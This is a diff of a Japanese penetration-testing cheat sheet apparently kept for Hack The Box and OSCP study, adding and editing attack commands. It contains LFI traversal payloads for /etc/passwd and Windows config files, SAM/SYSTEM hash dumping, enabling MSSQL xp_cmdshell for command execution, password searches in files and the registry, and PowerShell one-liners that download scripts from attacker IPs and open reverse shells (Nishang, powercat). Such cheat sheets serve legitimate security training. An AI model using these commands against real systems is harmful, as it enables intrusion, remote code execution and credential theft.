@@ -1,6 +1,4 @@
 # ペネトレーションテスト用チートシート
-Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
-随時更新して成長していきます。
 
 # Enum
 ## Nmap
@@ -390,7 +388,7 @@ dirb http://website.com -r -z 10
 
 #### ^Gobuster
 ```
-gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -x php,txt,py,html,png,jpg -o <output filename> -k
+gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -x php,txt,py,html,png,jpg -o <output filename> -k -s 200,204,301,302,307,401,403,303
 ```
 - dir...ディレクトリ総当たり
 - -t...スレッド数
@@ -478,7 +476,7 @@ AssignUserID joanna joanna
 ```
 
 ### ^LFI(ローカルファイルインクルード)
-file_get_contents関数の不備
+file_get_contents関数の不備。
 ```
 http://<url>/browse.php?files=../../../../../../../../etc/passwd
 http://<url>/browse.php?files=../../../../../../../../etc/hosts
@@ -521,8 +519,24 @@ Windows:
 ```
 /boot.ini
 /autoexec.bat
-/windows/system32/drivers/etc/hosts
-/windows/repair/S
+C:/windows/system32/drivers/etc/hosts
+```
+```
+C:/inetpub/wwwroot/
+C:/inetpub/wwwroot/web.config
+C:/inetpub/logs/logfiles/
+```
+```
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/security/webdav.htpasswd
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/xampp/tomcat/conf/tomcat-users.xml
+C:/xampp/tomcat/conf/web.xml
+C:/xampp/webalizer/webalizer.conf
+C:/xampp/webdav/webdav.txt
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/conf/httpd.conf
 ```
 
 パスワードハッシュの取得:
@@ -540,11 +554,11 @@ C:\Windows\System32\config\RegBack\SYSTEM.OLD
 ```
 ```
 pwdump SYSTEM SAM
-
+or
 samdump2 SYSTEM SAM
-
+or
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
-
+or
 impacket-secretsdump -sam SAM -security -system SYSTEM local
 ```
 
@@ -1518,6 +1532,39 @@ rsync -av .ssh rsync://192.168.227.126/fox/
 ssh -i id_rsa fox@192.168.227.126
 ```
 
+## Microsoft SQL Server(1433)
+```
+sudo apt install sqlcmd
+sqlcmd -U sa -S 192.168.227.70:1435
+
+or
+
+sqsh -U sa -S 192.168.227.70:1435
+```
+- -U...ユーザ名
+- -S...接続先
+
+### xp_cmdshellを利用したコマンド実行
+```
+# xp_cmdshellの有効化
+-- アドバンスオプションの変更を許可
+1> EXECUTE sp_configure 'show advanced options', 1;  
+2> go  
+-- アドバンスオプションの現在の設定を更新
+1> RECONFIGURE;  
+2> go  
+-- xp_cmdshellを有効化
+1> EXECUTE sp_configure 'xp_cmdshell', 1;  
+2> go  
+-- 更新
+1> RECONFIGURE;  
+2> go  
+```
+```
+1> xp_cmdshell "whoami"
+2> go
+```
+
 ## Oracle TNS Listener(1521)
 ODAT(Oracle Database Attacking Tool):  
 https://github.com/quentinhardy/odat
@@ -1972,7 +2019,7 @@ No password hashes left to crack (see FAQ)
 1 password hash cracked, 0 left
 ```
 
-## hashcat
+## ^hashcat
 ```
 cat hash
 cfdfb19f82040000f6b12fdf632b23aceb8772cdbf5bb7....snip
@@ -2004,7 +2051,7 @@ hashcat -r /usr/share/hashcat/rules/best64.rule --stdout keyword.txt
 hashcat:Rule-based Attack  
 https://hashcat.net/wiki/doku.php?id=rule_based_attack
 
-## Hydra
+## ^Hydra
 - -l...単一のユーザー名の指定
 - -L...ユーザーリストファイルの指定
 - -p...単一のパスワードの指定
@@ -2924,6 +2971,12 @@ https://github.com/jondonas/linux-exploit-suggester-2
 - トークンの偽装(Potato Attack, PrintSpoofer)
 - Kernel Exploit
 
+## PATH編集の修正
+whoamiなどのコマンドが使用できない場合に変数を編集して実行できるようにする。
+```
+set PATH=%SystemRoot%\system32;%SystemRoot%;
+```
+
 ## Windowsサービスを悪用した権限昇格
 ```
 # 現在のユーザーに割り当てられている特権を確認
@@ -3227,12 +3280,33 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o r
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
+## Passwords - files
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+```
+```
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+```
+```
+C:\> dir /b /s unattend.xml
+C:\> dir /b /s web.config
+C:\> dir /b /s sysprep.inf
+C:\> dir /b /s sysprep.xml
+C:\> dir /b /s *pass*
+C:\> dir /b /s vnc.ini
+```
+
 ## Passwords - Registry
 レジストリ内に保存されているパスワードを検索する。
 ```
 # HKLM
+reg query HKLM /f pass /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s
 # HKCU
+reg query HKCU /f pass /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 ```
@@ -3639,7 +3713,7 @@ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1/PowerUp
 powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
 ```
 
-#### Nishang
+#### ^Nishang
 ```
 # powershell.exe
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 4444
@@ -3653,7 +3727,7 @@ C:> echo IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/n
 powershell -exec bypass -c "iwr('http://10.10.10.1:8000/powercat.ps1')|iex;powercat -c 10.10.10.1 -p 4444 -e cmd"
 ```
 
-### PowerUp.ps1
+### ^PowerUp.ps1
 ```
 # Powershellの起動
 C:> powershell.exe -nop -exec bypass
